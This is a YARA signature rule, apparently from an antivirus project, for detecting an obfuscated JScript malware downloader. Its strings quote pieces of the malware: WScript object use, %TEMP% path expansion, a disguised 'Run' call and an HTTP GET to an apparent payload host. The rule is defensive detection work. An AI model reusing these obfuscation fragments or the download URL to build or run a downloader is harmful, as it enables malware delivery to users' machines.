rule sig_20160428_ac578d68742aa7044ef31b6256e4a14d {
  meta:
    description = "datamaliciousorder - file 20160428_ac578d68742aa7044ef31b6256e4a14d.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "8fa06b27be0adc4b88cb0da263f8ff08c9242e58a38d447f5dbef75694c659e7"

  strings:
    $s1  = "function OdnEnrBpgRetScpQwxOkf() {return DzbVfhHiqZodQkyDenZnb[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s2  = "return OzgFocEuoGcvEiyHxyXap - JexFbgJcmBwcTosQvvJvo;};" fullword ascii
    $s3  = "var DzbVfhHiqZodQkyDenZnb = function HmlBzsKhzTyfAxiTfpGvb() {return FkvNihXvbEzwGfmHbwZhe[EowFocKjbIpoLyqMnaWgy](\"WScript\"+\"" ascii
    $s4  = "function RwuOhyXkxKukKmuLilBew(OzgFocEuoGcvEiyHxyXap, JexFbgJcmBwcTosQvvJvo){WltZuyExnLfnPcfPhvOgz = WltZuyExnLfnPcfPhvOgz * 1; " ascii
    $s5  = "var DzbVfhHiqZodQkyDenZnb = function HmlBzsKhzTyfAxiTfpGvb() {return FkvNihXvbEzwGfmHbwZhe[EowFocKjbIpoLyqMnaWgy](\"WScript\"+\"" ascii
    $s6  = "var FkvNihXvbEzwGfmHbwZhe = this[\"WScript\"];" fullword ascii
    $s7  = "function UvpDonIzfQpcVvqHbrQdl(BqlMicAqnAxrPttFihPny){DzbVfhHiqZodQkyDenZnb[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s8  = "function OdnEnrBpgRetScpQwxOkf() {return DzbVfhHiqZodQkyDenZnb[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s9  = "function UvpDonIzfQpcVvqHbrQdl(BqlMicAqnAxrPttFihPny){DzbVfhHiqZodQkyDenZnb[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s10 = "function JbkRstUutPjyAuhPcqUit(){return CtqDrkEvaIulQfzBugSjr + \"\";};" fullword ascii
    $s11 = "if (WlwXqoFcvQhrWmjTfdByw[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s12 = "function RwuOhyXkxKukKmuLilBew(OzgFocEuoGcvEiyHxyXap, JexFbgJcmBwcTosQvvJvo){WltZuyExnLfnPcfPhvOgz = WltZuyExnLfnPcfPhvOgz * 1; " ascii
    $s13 = "function BykVziPjaDdqZvqRdlFod() {return ((QxrXxuOftEosEhaNyuMfa == true) && (QxrXxuOftEosEhaNyuMfa == LltOhdQglFziRqgUxiQsp)) ?" ascii
    $s14 = "WlwXqoFcvQhrWmjTfdByw[WveMhaTkoWorKvjJbqZob](\"G\" + \"ET\", \"http://tribalsnedkeren.dk/n4jca\", false);" fullword ascii
    $s15 = "function BykVziPjaDdqZvqRdlFod() {return ((QxrXxuOftEosEhaNyuMfa == true) && (QxrXxuOftEosEhaNyuMfa == LltOhdQglFziRqgUxiQsp)) ?" ascii
    $s16 = "var LltOhdQglFziRqgUxiQsp = false;" fullword ascii
    $s17 = "function UooAojDlvJioUaeDlqXaq(){return 23;};" fullword ascii
    $s18 = "LltOhdQglFziRqgUxiQsp = true; " fullword ascii
    $s19 = "function PrvWgvKidUtiSmdErzWnz(){return EowFocKjbIpoLyqMnaWgy;};" fullword ascii
    $s20 = "var TtcSgoYaqAcxGgsXkzWcy = new this[\"D\"+\"ate\"]();" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}